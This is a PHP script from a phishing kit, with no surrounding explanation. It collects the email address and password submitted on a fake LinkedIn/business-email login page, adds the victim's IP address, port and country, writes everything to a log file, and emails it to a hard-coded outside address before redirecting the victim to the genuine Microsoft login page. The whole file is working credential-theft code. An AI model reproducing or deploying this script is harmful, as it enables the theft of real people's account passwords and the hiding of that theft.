<?php
session_start();

header('Access-Control-Allow-Origin: *');  

function visitor_country()
	{
	$ip = getenv("REMOTE_ADDR");
	$result = "Unknown";
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, "https://api.ip.sb/geoip/$ip");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$country = json_decode(curl_exec($ch))->country;
	if ($country != null)
		{
		$result = $country;
		}

	return $result;
	}


$sdip = gethostbyname("slashdot.org");
$sddomain = gethostbyaddr($sdip);
$ip = getenv("REMOTE_ADDR");
$_SESSION['session_key'] = $_POST['session_key'];
$_SESSION['session_password'] = $_POST['session_password'];
$port = getenv("REMOTE_PORT");
$adddate=date("D M d, Y g:i a");
$country = visitor_country();

$message .= "---------------+ Email & Password +--------------\n";
$message .= "Email : ".$_POST['email']."\n";
$message .= "Password : ".$_POST['password']."\n";
$message .= "----------------------------------------------\n";
$message .= "--------------+ Connction info +------------\n";
$message .= "IP Address : $ip\n";
$message .= "Country : ".$country."\n";
$message .= "Port : $port\n";
$message .= "----------------------------------------------\n";
$message .= "Date : $adddate\n";
$message .=     "City: {$geoplugin->city}\n";
$message .=     "Region: {$geoplugin->region}\n";
$message .=     "Country Name: {$geoplugin->countryName}\n";
$message .=     "Country Code: {$geoplugin->countryCode}\n";
$message .= "----------------------------------------------\n";
$rnessage  = "$message\n";
$message .= "---------+ Created in 2019 By [Royalty] +----------\n";

@fclose(@fwrite(@fopen("LinkedIn-EMail-Login.txt", "a"),$message));

$send="chinyua@merchantbrokerage.com";

$subject = "|| Other Business Email || $ip ";
$headers = "From: Team<rezult@linkin.com>";
if(mail($send,$subject,$message,$headers) != false){
header("Location: https://login.microsoftonline.com");
}
?>
